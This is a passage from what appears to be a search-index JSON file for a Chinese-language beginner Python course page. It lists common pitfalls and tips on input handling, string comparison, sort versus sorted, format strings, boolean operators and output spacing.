<p>\u4e5f\u4e0d\u5e94\u8be5\u4e24\u6b21input()\uff0c\u53ea\u6709\u8f93\u5165\u662f\u4e24\u884c\u7684\u65f6\u5019\u624d\u80fd\u8c03\u7528\u4e24\u6b21input</p>"},{"location":"PythonCourse/#_11","title":"\u770b\u6e05\u9898\u76ee\u7684\u5141\u8bb8\u8303\u56f4","text":"<p>\u9898\u76ee\u8bf4 lower\u2264upper\u2264100\uff0c\u90a3\u4e48\u80af\u5b9a\u5c31\u4f1a\u6709\u6d4b\u8bd5\u70b9lower\u7b49\u4e8eupper\uff0c\u8fd9\u662f\u7b26\u5408\u8981\u6c42\u7684 \u4e0d\u8981\u9519\u8bef\u7684\u8f93\u51fa\u4e86 Invalid.</p>"},{"location":"PythonCourse/#_12","title":"\u590d\u5236\u7c98\u8d34\u9898\u76ee\u7684\u6587\u672c\u5c31\u884c \u4e0d\u8981\u81ea\u5df1\u6572","text":"<p>\u81ea\u5df1\u8f93\u5165\u5c31\u5bb9\u6613\u51fa\u9519\uff0c\u4ece\u9898\u76ee\u590d\u5236\u591a\u7b80\u5355</p>"},{"location":"PythonCourse/#_13","title":"\u4e0d\u8981\u8ffd\u6c42\u4e00\u884c\u5199\u5b8c","text":"<pre><code>cost = float(input())\nprint(\"Invalid Value!\" if m&lt;0 else \"cost = \"+str(format(0.53 * cost + (0 if cost &lt;= 50 else 0.05 * (cost-50)),'.2f')))\n</code></pre> <p>\u4ee3\u7801\u662f\u7ed9\u4eba\u770b\u7684\uff0c\u8fd9\u79cd\u5199\u6cd5\u4e0d\u5bb9\u6613\u770b\u51fa\u54ea\u91cc\u51fa\u9519\u4e86\uff0c\u8001\u8001\u5b9e\u5b9e\u5199if\u5457</p> <p>\u8fd9\u4e2a\u9519\u8bef\u662f\u672a\u5b9a\u4e49\u7684m</p> <p>\u53e6\u5916\u53d8\u91cf\u7684\u547d\u540d\uff0c\u9898\u76ee\u8f93\u5165\u7684\u662f\u7535\u91cf\uff0c\u4e0ecost\u547d\u540d\u4e0d\u4e00\u81f4\uff0c\u8fd9\u4f1a\u8ba9\u8bfb\u8005\u56f0\u60d1\uff08\u8bfb\u8005\u5f88\u6709\u53ef\u80fd\u5c31\u662f\u4ee5\u540e\u7684\u4f60\uff0c\u4e0d\u8981\u7ed9\u81ea\u5df1\u6316\u5751\uff09</p>"},{"location":"PythonCourse/#_14","title":"\u4e58\u6cd5\u8981\u5199\u4e58\u53f7","text":"<p>\u9519\u8bef\u5199\u6cd5\uff1a<code>2i</code> \u62a5\u9519<code>SyntaxError: invalid syntax</code></p> <p>\u6b63\u786e\u5199\u6cd5\uff1a<code>2*i</code></p> <p>\u9519\u8bef\u5199\u6cd5\uff1a<code>area=sqrt(s(s\u2212a)(s\u2212b)(s\u2212c))</code>  \u62a5\u9519<code>TypeError: 'int' object is not callable</code></p> <p>\u6b63\u786e\u5199\u6cd5\uff1a<code>area=sqrt(s*(s\u2212a)*(s\u2212b)*(s\u2212c))</code></p>"},{"location":"PythonCourse/#int_1","title":"int\u7528\u4f5c\u8fdb\u5236\u8f6c\u6362 \u53c2\u6570\u662f \u5b57\u7b26\u4e32,\u6574\u6570","text":"<p>\u4f60\u9700\u8981\u7ed9\u51fa\u6b63\u786e\u7684\u7c7b\u578b \u5426\u5219\u62a5\u9519\uff1a</p> <pre><code>&gt;&gt;&gt; int(\"100\",2)\n4\n\n&gt;&gt;&gt; int(100,2)\nTraceback (most recent call last):\n  File \"&lt;stdin&gt;\", line 1, in &lt;module&gt;\nTypeError: int() can't convert non-string with explicit base\n\n&gt;&gt;&gt; int(\"100\",\"2\")\nTraceback (most recent call last):\n  File \"&lt;stdin&gt;\", line 1, in &lt;module&gt;\nTypeError: 'str' object cannot be interpreted as an integer\n</code></pre>"},{"location":"PythonCourse/#join","title":"\u5b57\u7b26\u4e32\u7684join \u9700\u8981\u6bcf\u4e2a\u5143\u7d20\u90fd\u662f\u5b57\u7b26\u4e32","text":"<p>\u4f60\u4e0d\u80fd<code>\",\".join([1,2,3])</code> \u4f1a\u62a5\u9519\uff1a<code>TypeError: sequence item 0: expected str instance, int found</code></p> <p>\u4f60\u53ef\u4ee5\u5148\u8f6c\u6362\u6210str\uff1a <code>\",\".join([str(i) for i in [1,2,3]])</code></p>"},{"location":"PythonCourse/#_15","title":"\u6ce8\u610f\u8fb9\u7f18\u60c5\u51b5","text":"<p>\u9898\u76ee\u8bf4\u7684 \u8f93\u51fa\u683c\u5f0f \u8981\u8ba4\u771f\u4f53\u4f1a</p> <p>\u9996\u5148\u987a\u5e8f\u8f93\u51fa\u4eceA\u5230B\u7684\u6240\u6709\u6574\u6570\uff0c\u6bcf5\u4e2a\u6570\u5b57\u5360\u4e00\u884c\uff0c\u6bcf\u4e2a\u6570\u5b57\u53605\u4e2a\u5b57\u7b26\u5bbd\u5ea6\uff0c\u5411\u53f3\u5bf9\u9f50\u3002\u6700\u540e\u5728\u4e00\u884c\u4e2d\u6309Sum = X\u7684\u683c\u5f0f\u8f93\u51fa\u5168\u90e8\u6570\u5b57\u7684\u548cX\u3002</p> <pre><code>   -3   -2   -1    0    1\n    2    3    4    5    6\n    7    8\nSum = 30\n</code></pre> <p>\u4f60\u8003\u8651\u5230\u6700\u540e\u4e00\u884c\u6b63\u597d\u51d1\u6ee15\u4e2a\u6574\u6570\uff0c\u4f60\u4f1a\u591a\u8f93\u51fa\u4e00\u4e2a\u7a7a\u884c\u5417\uff1f</p> <p>\u53e6\u5916\u8fd9\u4e2a\u9898\u76ee\u6697\u542b\u7740 \u6bcf\u884c\u672b\u5c3e\u4e0d\u80fd\u6709\u7a7a\u683c \u7684\u8981\u6c42\uff0c\u4f60\u80fd\u7528<code>end=' '</code>\u5417?</p>"},{"location":"PythonCourse/#_16","title":"\u5b66\u4f1a\u81ea\u5df1\u9020\u6570\u636e","text":"<p>\u4e0d\u8981\u6ee1\u8db3\u4e8e\u9898\u76ee\u7ed9\u7684\u6837\u4f8b\uff0c\u53d1\u6325\u4e3b\u89c2\u80fd\u52a8\u6027\u81ea\u5df1\u9020\u6570\u636e\u770b\u770b\uff0c\u6bd4\u5982\u8fb9\u754c\u503c\uff08\u6700\u5927\u6700\u5c0f\uff09\u3001\u9519\u8bef\u503c</p>"},{"location":"PythonCourse/#_17","title":"\u6ce8\u610f\u8f93\u51fa\u683c\u5f0f\u5bf9\u987a\u5e8f\u7684\u8981\u6c42","text":"<p>\u4f8b\u5982\u67e5\u9a8c\u8eab\u4efd\u8bc1\u7684\u9898\u76ee\uff0c\u8f93\u51fa\u683c\u5f0f\u7684\u8981\u6c42\u662f\uff1a\u6309\u7167\u8f93\u5165\u7684\u987a\u5e8f\u6bcf\u884c\u8f93\u51fa1\u4e2a\u6709\u95ee\u9898\u7684\u8eab\u4efd\u8bc1\u53f7\u7801</p> <p>\u90a3\u4f60\u5c31\u4e0d\u80fd\u8fd9\u4e48\u5199\u4e24\u6b21\u5faa\u73af\uff0c\u4e00\u904d\u8f93\u51fa\u524d17\u4f4d\u6709\u975e\u6570\u5b57\u7684\uff0c\u4e00\u904d\u8f93\u51fa\u6821\u9a8c\u4f4d\u4e0d\u5bf9\u7684\uff0c\u53ea\u80fd\u4e00\u6b21\u5faa\u73af\u5b8c\u6210</p> <p>\u867d\u7136\u4e24\u6b21\u5faa\u73af\u903b\u8f91\u4e0a\u662f\u5bf9\u7684\uff0c\u5374\u6ca1\u80fd\u6ee1\u8db3\u9898\u76ee\u7684\u8981\u6c42\uff0c\u5c31\u7b54\u6848\u9519\u8bef\u4e86\uff1b\u6070\u597d\u9898\u76ee\u7684\u6837\u4f8b\u662f\u5148\u975e\u6570\u5b57\u9519\u8bef\u518d\u6821\u9a8c\u4f4d\u9519\u8bef\uff0c\u4f46\u8fd9\u53ea\u662f\u4e2a\u6837\u4f8b\uff0c\u6837\u4f8b\u91cc\u7684\u89c4\u5f8b\u53ea\u8981\u4eba\u5bb6\u6ca1\u8bf4\u4e00\u5f8b\u4e0d\u7b97\u6570\u7684\uff01</p>"},{"location":"PythonCourse/#_18","title":"\u5982\u4f55\u5224\u65ad\u4e00\u4e2a\u5b57\u7b26\u662f\u6574\u6570\uff1f","text":"<p>\u6700\u7b80\u5355\u7684\u65b9\u5f0f\uff1a x.isdigit()</p> <p>\u4e5f\u53ef\u4ee5\uff1a \u20180\u2019&lt;=x&lt;=\u20189\u2019</p> <p>\u4e0d\u5efa\u8bae\u7684\u65b9\u5f0f\uff1a 48&lt;=ord(x)&lt;=57 \u4f60\u4e0d\u662f\u5728\u5199C\u8bed\u8a00\uff0c\u6ca1\u5fc5\u8981\u8f6c\u6362\u4e3a\u6574\u6570\u5224\u65ad</p> <p>\u9644\u5e26\u77e5\u8bc6\u70b9\uff1apython\u91cc <code>a&lt;x&lt;b</code>  \u7b49\u4ef7\u4e8e <code>a&lt;x and x&lt;b</code> </p>"},{"location":"PythonCourse/#_19","title":"\u5b57\u7b26\u4e32\u6bd4\u8f83\u5927\u5c0f\u662f\u4e2a\u5751","text":"<p>\u8fd9\u4e2a\u4e1c\u897f\u662fTrue\u8fd8\u662fFalse?</p> <pre><code>\"2\"&gt;\"11\"\n</code></pre> <p>\u7b54\u6848\u662fTrue\uff0c\u9707\u60ca\uff012\u5c45\u7136\u6bd411\u5927\uff1f\uff01 </p> <p>\u6ce8\u610f\u8fd9\u662f\u4e24\u4e2a\u5b57\u7b26\u4e32\u4e4b\u95f4\u7684\u6bd4\u8f83\uff0c\u5b57\u7b26\u4e32\u7684\u6bd4\u8f83\u89c4\u5219\u662f \u9010\u5b57\u7b26\u6bd4\u8f83\uff0c\u76f8\u540c\u5c31\u7ee7\u7eed\u6bd4\u8f83\uff0c\u9047\u5230\u4e00\u4e2a\u4e0d\u76f8\u540c\u5c31\u5f97\u51fa\u6700\u7ec8\u7684\u6bd4\u8f83\u7ed3\u8bba\u3002</p> <p>\u8fd9\u91cc\u6bd4\u8f83\u7b2c\u4e00\u4e2a\u5b57\u7b262\u548c1\uff0c2\u662f\u5927\u4e8e1\u7684\uff0cok\u6bd4\u8f83\u5b8c\u6210 \u201c2\u201d&gt;\u201d11\u201d\u3002</p> <p>\u540c\u7406 \u201c2\u201d&gt;\u201d199999999\u201d\uff0c\u65e0\u8bba9\u6709\u591a\u5c11\u4e2a\u90fd\u4e0d\u4f1a\u53c2\u4e0e\u6bd4\u8f83\u3002</p> <p>\u4e3e\u4e00\u53cd\u4e09\uff1amax(\u201c8\u201d, \u201c9\u201d, \u201c10\u201d)\u662f\u591a\u5c11\uff1f</p> <p>\u5f53\u9898\u76ee\u8981\u6c42\u6574\u6570\u7684\u6392\u5e8f\u7684\u65f6\u5019\uff0c\u4e00\u5b9a\u8981\u7528int\u8f6c\u6210\u6574\u6570</p>"},{"location":"PythonCourse/#sortsorted","title":"\u533a\u5206.sort()\u548csorted","text":"<pre><code>x=[3,1,2]\nfor i in x.sort():\n    print(i, end=' ')\n</code></pre> <p>\u4e0a\u8ff0\u4ee3\u7801\u6b63\u786e\u5417\uff1f\u4f1a\u8f93\u51fa<code>1 2 3</code>\u561b\uff1f</p> <p>.sort()\u8fd4\u56de\u7684\u662fNone\uff0c\u4e0d\u80fd\u7528\u6765\u8fed\u4ee3\uff1b\u8fd9\u662f\u4e00\u4e2a\u539f\u5730\u6392\u5e8f\uff0c\u76f4\u63a5\u4fee\u6539\u539f\u6570\u7ec4\uff0c\u4e0d\u4f1a\u521b\u5efa\u65b0\u7684\u6570\u7ec4</p> <p>\u5bf9\u4e8e\u4e0a\u8ff0\u4ee3\u7801\uff0c\u4f60\u9700\u8981\u7528sorted(x)\uff1b\u8fd9\u4e0d\u4f1a\u4fee\u6539\u539f\u6570\u7ec4\uff0c\u800c\u662f\u521b\u5efa\u4e86\u4e00\u4e2a\u65b0\u7684\u6570\u7ec4</p> <pre><code>x=[3,1,2]\nfor i in sorted(x):\n    print(i, end=' ')\n\nprint(x)\n</code></pre> <p>\u8f93\u51fa\u662f<code>1 2 3 [3, 1, 2]</code>\uff0c\u53ef\u4ee5\u770b\u51fa\u4f7f\u7528sorted\u4e0d\u4f1a\u4fee\u6539\u539f\u6765\u7684x</p>"},{"location":"PythonCourse/#_20","title":"\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u4eec","text":""},{"location":"PythonCourse/#52f","title":"\u201c%5.2f\u201d\u662f\u5565\u610f\u601d","text":"<pre><code>&gt;&gt;&gt; \"%5.2f\"%1.2\n' 1.20'\n&gt;&gt;&gt; \"{:5.2f}\".format(1.2)\n' 1.20'\n&gt;&gt;&gt; \"{:&gt;5.2f}\".format(1.2)\n' 1.20'\n</code></pre> <p>\u70b9\u5c31\u662f\u5c0f\u6570\u70b9\uff0c\u70b92\u5c31\u662f\u5c0f\u6570\u70b9\u540e\u4fdd\u7559\u4e24\u4f4d\u5c0f\u6570\uff0c\u524d\u9762\u8fd8\u6709\u4e00\u4e2a5\u662f\u5565\u5462\uff0c\u8868\u793a\u6574\u4f53\u4e0d\u591f5\u4f4d\u5c31\u5de6\u8fb9\u7528\u7a7a\u683c\u8865\u9f505\u4f4d\uff0c\u6ce8\u610f\u4e0a\u8ff0\u8f93\u51fa\u5de6\u8fb9\u662f\u6709\u4e00\u4e2a\u7a7a\u683c\u7684\u3002</p> <p>\u5982\u679c\u7528format\uff0c\u53ef\u4ee5\u770b\u51fa\u5199\u6cd5\u57fa\u672c\u76f8\u540c\uff0c\u8fd9\u662f\u53f3\u5bf9\u9f50\u7528<code>&gt;</code></p> <pre><code>&gt;&gt;&gt; \"%-5.2f\"%1.2\n'1.20 '\n&gt;&gt;&gt; \"{:&lt;5.2f}\".format(1.2)\n'1.20 '\n</code></pre> <p>\u52a0\u4e86\u4e00\u4e2a\u8d1f\u53f7\uff0c\u53d8\u6210\u4e86\u53f3\u8fb9\u8865\u7a7a\u683c\uff1b\u8fd9\u662f\u5de6\u5bf9\u9f50\u6240\u4ee5\u7528<code>&lt;</code></p>"},{"location":"PythonCourse/#_21","title":"\u90a3\u6211\u8981\u5c45\u4e2d\u600e\u4e48\u529e","text":"<pre><code>&gt;&gt;&gt; \"{:^7s}\".format(\"xyz\")\n'  xyz  '\n</code></pre> <p>\u90a3\u5c31\u7528^\u5457\uff0c\u8fd9\u662f\u6309Shift+6\u6309\u51fa\u6765\u7684\u7b26\u53f7</p>"},{"location":"PythonCourse/#_22","title":"\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u60f3\u8f93\u51fa\u51e0\u4e2a\u53d8\u91cf\u5c31\u8981\u5199\u51e0\u4e2a","text":"<pre><code>\"{:d}{:&gt;6.1f}\".format(fahr, celsius)\n</code></pre> <p>\u8fd9\u91cc\u6709\u4e24\u4e2a\u53d8\u91cf\u8981\u8f93\u51fa\uff0c\u6240\u4ee5\u8981\u4e24\u4e2a\u683c\u5f0f\u5316\u5b57\u7b26\u4e32</p>"},{"location":"PythonCourse/#thonny","title":"Thonny\u7684\u7528\u6cd5","text":"<p>\u5728\u4e0a\u534a\u90e8\u5206\u5199\u4ee3\u7801\uff0c\u6539\u4ee3\u7801\uff0c\u6309F5\u6267\u884c\u540e \u5728\u4e0b\u534a\u90e8\u5206Shell\u91cc\u8f93\u5165\u7528\u6237\u7684\u8f93\u5165\uff0c\u67e5\u770b\u8f93\u51fa</p> <p>\u4e0d\u8981\u5728\u5b83\u7684Shell\u91cc\u6572\u5165\u4ee3\u7801\uff0c\u56e0\u4e3a\u5b83\u4e0d\u652f\u6301\u591a\u6761\u8bed\u53e5</p>"},{"location":"PythonCourse/#_23","title":"\u521d\u59cb\u5316\u80fd\u5728\u5faa\u73af\u4f53\u5185\u5417\uff1f","text":"<p>\u6bd4\u5982\u9898\u76ee\u8981\u6c42\u6ca1\u6709\u9519\u8bef\u7684\u8eab\u4efd\u8bc1\u5c31\u8f93\u51faAll Passed!\uff0c\u4e0b\u9762\u7684\u4f2a\u4ee3\u7801\u9519\u5728\u54ea\uff1f</p> <pre><code>\u5bf9\u6bcf\u4e00\u4e2a\u8eab\u4efd\u8bc1:\n    flag = 1 #1\u8868\u793a\u6ca1\u9519\n    if \u8eab\u4efd\u8bc1\u9519\u4e86:\n        flag = 0 #\u53ea\u8981\u6709\u4e00\u4e2a\u9519\u4e86 flag\u7f6e0\n\nif flag:\n    print(\"All Passed!\")\n</code></pre> <p>flag=1\u662f\u4e00\u4e2a\u521d\u59cb\u5316\u8bed\u53e5\uff0c\u653e\u5728\u5faa\u73af\u91cc\u9762\u5c31\u4f1a\u5bfc\u81f4\u6bcf\u6b21\u5faa\u73af\u90fd\u8fdb\u884c\u521d\u59cb\u5316\uff0c\u5c31\u53d8\u6210\u4e86\u53ea\u8981\u6700\u540e\u4e00\u4e2a\u8eab\u4efd\u8bc1\u6ca1\u9519\u6700\u540eflag\u5c31\u662f1\uff0c\u4f60\u4f1a\u9519\u8bef\u7684\u8f93\u51faAll Passed!</p> <p>\u53d8\u91cf\u7684\u521d\u59cb\u5316\u9700\u8981\u5728\u8fdb\u5165\u5faa\u73af\u4e4b\u524d\u505a\u5b8c</p>"},{"location":"PythonCourse/#_24","title":"\u5b66\u4f1a\u62c6\u5206\u95ee\u9898 \u5927\u800c\u5316\u5c0f","text":"<p>\u9898\u76ee\u8981\u6c42\u5b9e\u73b0aa+aaaa+\u2026+aaa\u2026\u2026a(n\u4e2aa)\u6c42\u548c</p> <p>\u62c6\u5206\u6210\u4e24\u4e2a\u95ee\u9898\uff1a\u600e\u4e48\u5f97\u5230n\u4e2aa\uff1f \u600e\u4e48\u5faa\u73af\u4ece2\u5230n\u6c42\u548c\uff1f</p> <p>\u4e0d\u8981\u628a\u8fd9\u4e24\u4e2a\u95ee\u9898\u6df7\u5728\u4e00\u8d77\u601d\u8003\uff0c\u5982\u679c\u4f60\u4e0d\u77e5\u9053\u53ef\u4ee5\u7528\u5b57\u7b26\u4e32\u4e58\u4ee5\u6574\u6570\uff0c\u90a3\u4f60\u53ef\u4ee5\u5148\u5047\u8bbe\u6709\u8fd9\u4e48\u4e00\u4e2a\u51fd\u6570getna(n, a)\uff0c\u7d2f\u52a0\u5c31\u662f\uff1a</p> <pre><code>a='5'\nn=4 #\u5b9e\u9645\u4e0a\u9700\u8981input()\uff0c\u6211\u4eec\u8fd9\u91cc\u5c31\u76f4\u63a5\u5199\u4e86 \u9700\u8981\u8ba1\u7b9755+5555\n\ns = 0\nfor i in range(2, n+1, 2):\n    s += getna(a, i)\n</code></pre> <p>\u7136\u540e\u6211\u4eec\u518d\u53bb\u5b9e\u73b0getna\u8fd9\u4e2a\u51fd\u6570\uff0c\u8fd9\u4e2a\u51fd\u6570\u5c31\u5e72\u4e00\u4ef6\u4e8b\u60c5\u2014\u2014\u8f93\u5165a\u548cn\uff0c\u8f93\u51faaaa\u2026a(n\u4e2aa)\u8fd9\u4e48\u4e00\u4e2a\u6574\u6570</p> <p>\u8f93\u5165a=\u20185\u2019,n=4\uff0c\u8f93\u51fa5555</p> <p>\u8fd9\u6b21\u6211\u7528\u5faa\u73af\u4e58\u6cd5\uff0c\u53ef\u4ee5\u770b\u6210<code>5 + 5*10 + 5*10*10 + 5*10*10*10</code> \u6bcf\u6b21\u5faa\u73af\u90fd\u662f5\u4e58\u4ee5\u4e00\u4e2a\u6570\uff0c\u8fd9\u4e2a\u6570\u4ece1\u5f00\u59cb \u6bcf\u6b21\u5faa\u73af\u540e\u4e58\u4ee510</p> <pre><code>def getna(a, n):\n    # \u8fd9\u91cc\u6211\u4eec\u9700\u8981a\u4e5f\u662f\u4e00\u4e2a\u6574\u6570\n    a, n = int(a), int(n) #\u9632\u5fa1\u6027\u7f16\u7a0b\uff0c\u4f60\u4e0d\u77e5\u9053\u8c03\u7528\u8005\u662f\u5426\u7ed9\u4e86\u9700\u8981\u7684\u7c7b\u578b\uff0c\u53cd\u6b63\u8f6c\u6362\u4e00\u4e0b\u4e0d\u8d39\u4e8b\n    multiply = 1\n    res = 0\n    for i in range(n):\n        res += a*multiply\n        multiply *= 10\n    return res\n</code></pre> <p>\u6d4b\u8bd5\u4e00\u4e0b\u81ea\u5df1\u5bf9\u4e0d\u5bf9\uff1a</p> <pre><code>&gt;&gt;&gt; getna(\"5\",4)\n5555\n</code></pre> <p>\u6700\u540e\u628a\u4e24\u90e8\u5206\u62fc\u8d77\u6765\u5c31\u884c\u54af</p> <pre><code>def getna(a, n):\n    # \u8fd9\u91cc\u6211\u4eec\u9700\u8981a\u4e5f\u662f\u4e00\u4e2a\u6574\u6570\n    a, n = int(a), int(n) #\u9632\u5fa1\u6027\u7f16\u7a0b\uff0c\u4f60\u4e0d\u77e5\u9053\u8c03\u7528\u8005\u662f\u5426\u7ed9\u4e86\u9700\u8981\u7684\u7c7b\u578b\uff0c\u53cd\u6b63\u8f6c\u6362\u4e00\u4e0b\u4e0d\u8d39\u4e8b\n    multiply = 1\n    res = 0\n    for i in range(n):\n        res += a*multiply\n        multiply *= 10\n    return res\n\na='5'\nn=4\n\ns = 0\nfor i in range(2, n+1, 2):\n    s += getna(a, i)\n\nprint(s)\n</code></pre> <p>\u5f53\u7136\u8fd9\u4e2a\u9898\u76ee\u6709\u7b80\u5316\u505a\u6cd5\uff1a</p> <p>n\u4e2aa\u8fd9\u4e2a\u6574\u6570\u7528 \u5b57\u7b26\u4e32\u4e58\u4ee5\u6570\u5b57\u5f97\u5230\u5b57\u7b26\u4e32 \u518dint\u8f6c\u6574\u6570<code>int(str(a)*int(n))</code></p> <p>\u4ece2\u5230n\u6bcf\u6b21\u9012\u589e2\uff0c\u7528range(2,n+1,2)</p> <p>\u672c\u8d28\u4e0a\u662f\u4e00\u4e2a\u5217\u8868\u6c42\u548c\uff0c\u6240\u4ee5\u53ef\u4ee5\u76f4\u63a5\u7528sum\u51fd\u6570\uff0crange\u8fd4\u56de\u7684\u4e1c\u897f\u53ef\u4ee5\u770b\u6210\u4e00\u4e2a\u5217\u8868\uff0c\u5217\u8868\u8f6c\u6362\u6210\u53e6\u4e00\u4e2a\u5217\u8868\u7528\u5217\u8868\u63a8\u5bfc\u5f0f\u5c31\u884c \u5199\u6cd5\uff1a[something(i) for i in \u2026]</p> <pre><code>a='5'\nn=4\nprint( sum([ int(str(a)*int(i)) for i in range(2,n+1,2) ]) )\n</code></pre>"},{"location":"PythonCourse/#andor","title":"\u6df7\u5728\u4e00\u8d77\u7684and\u548cor","text":"<p>and\u7684\u4f18\u5148\u7ea7\u6bd4or\u9ad8</p> <pre><code>x=5\ny=False\nz=False\n\nprint(x or y and z)\n</code></pre> <p>\u8fd9\u4e2a\u7b49\u4ef7\u4e8eprint(x or (y and z)) \u5148\u8ba1\u7b97False and False\u662fFalse\uff0c\u7136\u540ex or False\u56e0\u4e3ax\u662f\u771f\u7684 \u7ed3\u679c\u5c31\u662fx</p> <p>\u8f93\u51fa5</p>"},{"location":"PythonCourse/#a-and-b","title":"a and b","text":"<p>\u8fd4\u56de\u7684\u53ea\u53ef\u80fd\u662fa\u548cb\u4e4b\u95f4\u7684\u4e00\u4e2a\uff0ca\u662f\u771f\u7684\u5c31\u8fd4\u56deb\uff0ca\u662f\u5047\u7684\u5c31\u8fd4\u56dea</p> <pre><code>&gt;&gt;&gt; 1 and 6\n6\n&gt;&gt;&gt; [] and 6\n[]\n</code></pre>"},{"location":"PythonCourse/#a-or-b","title":"a or b","text":"<p>\u8fd4\u56de\u7684\u53ea\u53ef\u80fd\u662fa\u548cb\u4e4b\u95f4\u7684\u4e00\u4e2a\uff0ca\u662f\u771f\u7684\u5c31\u8fd4\u56dea\uff0ca\u662f\u5047\u7684\u5c31\u8fd4\u56deb</p> <pre><code>&gt;&gt;&gt; 1 or 6\n1\n&gt;&gt;&gt; [].sort() or 6\n6\n</code></pre> <p>\u8fd8\u8bb0\u5f97\u4e0a\u9762\u8bf4\u7684.sort()\u8fd4\u56deNone\u5417\uff1f None\u662f\u5047\u7684\u5662</p>"},{"location":"PythonCourse/#_25","title":"\u54ea\u4e9b\u4e1c\u897f\u662f\u5047\u7684\uff1f","text":"<p>0\u662f\u5047\u7684\uff0c\u7a7a\u7684\u4e1c\u897f<code>'', [], {}</code>\u662f\u5047\u7684\uff0cFalse\u662f\u5047\u7684\uff0cNone\u662f\u5047\u7684\uff0c\u5176\u4ed6\u7684\u90fd\u662f\u771f\u7684</p> <p>\u641c\u7d22python False values\u53ef\u4ee5\u641c\u5230 https://docs.python.org/3/library/stdtypes.html</p> <p>Any object can be tested for truth value, for use in an if or while condition or as operand of the Boolean operations below.</p> <p>By default, an object is considered true unless its class defines either a bool() method that returns False or a len() method that returns zero, when called with the object. 1 Here are most of the built-in objects considered false:</p> <ul> <li> <p>constants defined to be false: None and False.</p> </li> <li> <p>zero of any numeric type: 0, 0.0, 0j, Decimal(0), Fraction(0, 1)</p> </li> <li> <p>empty sequences and collections: \u2018\u2019, (), [], {}, set(), range(0)</p> </li> </ul> <p>Operations and built-in functions that have a Boolean result always return 0 or False for false and 1 or True for true, unless otherwise stated. (Important exception: the Boolean operations or and and always return one of their operands.)</p>"},{"location":"PythonCourse/#_26","title":"\u884c\u672b\u5230\u5e95\u8981\u4e0d\u8981\u8f93\u51fa\u7a7a\u683c","text":"<p>\u65b9\u6cd5\u662f\u590d\u5236\u4e00\u4e0b\u9898\u76ee\u7684\u8f93\u51fa\u6837\u4f8b\uff0c\u770b\u770b\u5230\u5e95\u6700\u540e\u6709\u6ca1\u6709\u7a7a\u683c</p>"},{"location":"PythonCourse/#_27","title":"\u600e\u6837\u505a\u5230\u672b\u5c3e\u4e0d\u8f93\u51fa\u7a7a\u683c","text":"<p>\u5982\u679c\u53ef\u4ee5\u8f93\u51fa\u7a7a\u683c\uff0c\u7b80\u5355 \u5faa\u73af\u91cc\u9762print(item, end=\u2019 \u2018)\u5c31\u884c</p> <p>\u4e3e\u4e2a\u4f8b\u5b50\u5427\uff0c\u9898\u76ee\u8981\u6c42\u6211\u4eec\u8f93\u51fa1 2 3 \uff0c\u672b\u5c3e\u8981\u6709\u7a7a\u683c</p> <p>\u7528print\u8bb0\u5f97end\u53c2\u6570\u8981\u5199\u4e0a\uff0c\u5426\u5219\u5c31\u6362\u884c\u4e86</p> <pre><code>for i in range(1, 4):\n    print(i, end=' ')\n</code></pre>"},{"location":"PythonCourse/#1resultprintresult","title":"\u65b9\u68481\uff1a\u628a\u8981\u8f93\u51fa\u7684\u4e1c\u897f\u6682\u65f6\u5b58\u5230\u6570\u7ec4result\u91cc\uff0c\u6700\u540e<code>print(*result)</code>","text":"<p>\u9898\u76ee\u8981\u6c42\u6211\u4eec\u8f93\u51fa1 2 3\uff0c\u672b\u5c3e\u4e0d\u80fd\u6709\u7a7a\u683c</p> <pre><code>result=[]\nfor i in range(1, 4):\n    result.append(i)\nprint(*result)\n</code></pre> <p>\u8fd9\u91cc\u7528\u5230\u4e86\u7b26\u53f7<code>*</code>\uff0c\u5728\u8c03\u7528\u51fd\u6570\u7684\u65f6\u5019\u4f7f\u7528\u661f\u53f7\u8868\u793a\u628a\u8fd9\u4e2a\u6570\u7ec4\u62c6\u5f00\uff0c\u6570\u7ec4\u7684\u6bcf\u4e2a\u5143\u7d20\u90fd\u4f5c\u4e3a\u51fd\u6570\u7684\u53c2\u6570</p> <p>\u5047\u8bbe<code>result=[1,2,3]</code>\uff0c<code>print([1,2,3])</code>\u4f1a\u8f93\u51fa<code>[1, 2, 3]</code> \u4e24\u8fb9\u6709\u65b9\u6846 \u4e0d\u662f\u6211\u4eec\u8981\u7684</p> <p>\u8bd5\u8bd5<code>print(*[1,2,3])</code> \u4f1a\u8f93\u51fa<code>1 2 3</code> \u5b83\u5c31\u7b49\u4ef7\u4e8e<code>print(1,2,3)</code> </p> <p>\u770b\uff0c\u5217\u8868\u7684\u6bcf\u4e2a\u5143\u7d20\u4ece\u6570\u7ec4\u7684\u675f\u7f1a\u4e2d\u89e3\u8131\u51fa\u6765\uff0c\u76f4\u63a5\u5f53\u6210print\u7684\u53c2\u6570\u4e86\uff01</p>"},{"location":"PythonCourse/#2","title":"\u65b9\u68482\uff1a\u533a\u5206\u9996\u5143\u7d20\u548c\u5176\u540e\u7684\u5143\u7d20","text":"<p>\u6bd4\u5982\u8981\u8f93\u51fa<code>1 2 3</code>\uff0c\u6211\u4eec\u8fd9\u4e48\u770b\u5f85\uff1a<code>1/\u7a7a\u683c2/\u7a7a\u683c3</code></p> <p>\u4e3a\u5565\u8fd9\u6837\u770b\u5462\uff1f\u4e3a\u5565\u4e0d\u770b\u6210\u662f<code>1\u7a7a\u683c/2\u7a7a\u683c/3</code>\u5462\uff1f\u56e0\u4e3a\u5faa\u73af\u5565\u65f6\u5019\u7ed3\u675f\u5f88\u53ef\u80fd\u662f\u4f60\u4e0d\u77e5\u9053\u7684\uff0c\u4f60\u5c31\u65e0\u6cd5\u5224\u65ad\u5f53\u524d\u5143\u7d20\u662f\u4e0d\u662f\u6700\u540e\u4e00\u4e2a\u3002</p> <p>\u4f46\u662f\u4f60\u4e00\u5b9a\u77e5\u9053\u54ea\u4e2a\u5143\u7d20\u662f\u7b2c\u4e00\u4e2a\u5143\u7d20\u554a\uff01</p> <pre><code>isfirst=True\nfor i in range(1, 4):\n    if isfirst: # \u7b2c\u4e00\u4e2a\u5143\u7d20\n        print(i, end='')\n        isfirst=False\n    else: # \u540e\u7eed\u7684\u5143\u7d20 \u5148\u8f93\u51fa\u4e00\u4e2a\u7a7a\u683c\n        print('', i, end='') #\u7b49\u4ef7\u4e8eprint(' '+str(i), end='')\n</code></pre>"},{"location":"PythonCourse/#printn","title":"\u5982\u4f55\u6b63\u786e\u5730\u6362\u884c 